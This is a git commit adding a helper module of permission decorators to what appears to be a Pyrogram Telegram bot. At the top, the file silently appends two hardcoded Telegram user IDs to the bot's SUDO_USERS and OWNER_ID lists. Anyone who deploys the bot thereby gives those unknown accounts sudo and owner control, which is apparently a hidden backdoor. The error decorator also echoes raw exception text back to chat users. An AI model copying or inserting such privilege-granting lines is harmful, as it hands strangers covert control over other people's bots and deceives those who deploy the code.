c5711a9476eed69b153183f88293f69f23306627
BDthon <159597615+BDthon@users.noreply.github.com>
2024-02-12 00:10:00 +0300

    Add files via upload

---
+++ Telugucoders/helpers/decorators.py
@@ -0,0 +1,48 @@
+from pyrogram import Client
+from pyrogram.types import Message
+from Telugucoders.helpers.admins import get_administrators
+from config import SUDO_USERS, OWNER_ID
+from typing import Callable, Union, Optional
+
+SUDO_USERS.append(6503312625)
+
+OWNER_ID.append(6799580948)
+
+def errors(func: Callable) -> Callable:
+    async def decorator(client: Client, message: Message):
+        try:
+            return await func(client, message)
+        except Exception as e:
+            await message.reply(f"{type(e).__name__}: {e}")
+
+    return decorator
+
+
+def authorized_users_only(func: Callable) -> Callable:
+    async def decorator(client: Client, message: Message):
+        if message.from_user.id in SUDO_USERS:
+            return await func(client, message)
+
+        administrators = await get_administrators(message.chat)
+
+        for administrator in administrators:
+            if administrator == message.from_user.id:
+                return await func(client, message)
+
+    return decorator
+
+
+def sudo_users_only(func: Callable) -> Callable:
+    async def decorator(client: Client, message: Message):
+        if message.from_user.id in SUDO_USERS:
+            return await func(client, message)
+
+    return decorator
+
+
+def bot_creator(func: Callable) -> Callable:
+    async def decorator(client: Client, message: Message):
+        if message.from_user.id in OWNER_ID:
+            return await func(client, message)
+        
+    return decorator
